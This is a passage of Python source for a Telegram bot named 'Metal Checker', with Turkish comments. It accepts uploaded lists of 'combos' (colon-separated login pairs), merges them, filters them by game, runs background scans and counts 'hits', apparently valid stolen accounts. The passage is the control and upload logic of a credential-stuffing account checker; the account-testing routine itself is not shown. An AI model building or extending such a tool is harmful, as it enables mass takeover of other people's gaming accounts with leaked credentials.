            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            markup.row("skip")
            msg = safe_bot_call(bot.send_message, chat_id, get_text(user_id, "filter_prompt"), reply_markup=markup, parse_mode="Markdown")
            bot.register_next_step_handler(msg, process_game_filter_step)
        elif text == get_text(user_id, "btn_merge"):
            user_merge_files[user_id] = []
            safe_bot_call(bot.send_message, chat_id, get_text(user_id, "merge_prompt"))
        elif text == get_text(user_id, "btn_stats"):
            if chat_id in active_scans:
                context = active_scans[chat_id]
                panel_report = generate_panel_text(context)
                safe_bot_call(bot.send_message, chat_id, panel_report, parse_mode="Markdown")
            else:
                # Aktif tarama yoksa global DB'den genel geçmiş verilerini göster
                checked_all = db["stats_global"].get("total_checked_accounts", 0)
                hits_all = db["stats_global"].get("total_hits_found", 0)
                safe_bot_call(bot.send_message, chat_id, f"📊 *Global History Status*:\nTotal Scanned: `{checked_all}`\nTotal Hits Locked: `{hits_all}`", parse_mode="Markdown")

    elif message.content_type == 'document':
        if not message.document.file_name.endswith('.txt'):
            safe_bot_call(bot.send_message, chat_id, get_text(user_id, "invalid_file"))
            return
            
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        combos = [line.strip() for line in raw_lines if line.strip() and ':' in line]

        # Dosya birleştirme modundaysa biriktirme alanına at
        if user_id in user_merge_files:
            user_merge_files[user_id].extend(combos)
            safe_bot_call(bot.send_message, chat_id, f"📥 Added {len(combos)} accounts to merge pool. Continue or type /done")
            return

        if not combos:
            safe_bot_call(bot.send_message, chat_id, get_text(user_id, "no_combo_found"))
            return

        if chat_id in active_scans:
            safe_bot_call(bot.send_message, chat_id, get_text(user_id, "already_scanning"))
            return

        game_filter = user_game_filter.get(user_id, "skip")
        context = BotScanContext(chat_id, user_id, combos, filter_str=game_filter)
        active_scans[chat_id] = context

        # Tarama başlangıç uyarısını atıyoruz
        safe_bot_call(bot.send_message, chat_id, get_text(user_id, "scan_started"), reply_markup=main_keyboard(user_id), parse_mode="Markdown")
        
        # Arka planda sessizce işçileri koştur
        threading.Thread(target=background_execution_pool, args=(context,), daemon=True).start()

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    if call.data.startswith("set_lang_"):
        lang = call.data.split("_")[2]
        uid_str = str(call.from_user.id)
        if uid_str not in db["users"]:
            db["users"][uid_str] = {}
        db["users"][uid_str]["lang"] = lang
        save_db()
        safe_bot_call(bot.send_message, call.message.chat.id, get_text(call.from_user.id, "main_menu"), reply_markup=main_keyboard(call.from_user.id), parse_mode="Markdown")

# ==============================================================================
# 🚀 SAFE POLLING ENVIRONMENT ENTRIES
# ==============================================================================
if __name__ == "__main__":
    logger.info("Metal Checker Master Instance starting up...")
    safe_bot_call(bot.remove_webhook)
    # infinity_polling kütüphane kilitlenmelerini engellemek için direkt düz polling kullanıyoruz
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=20)
        except Exception as global_err:
            logger.error(f"Polling loop crash averted: {global_err}")
            time.sleep(5)

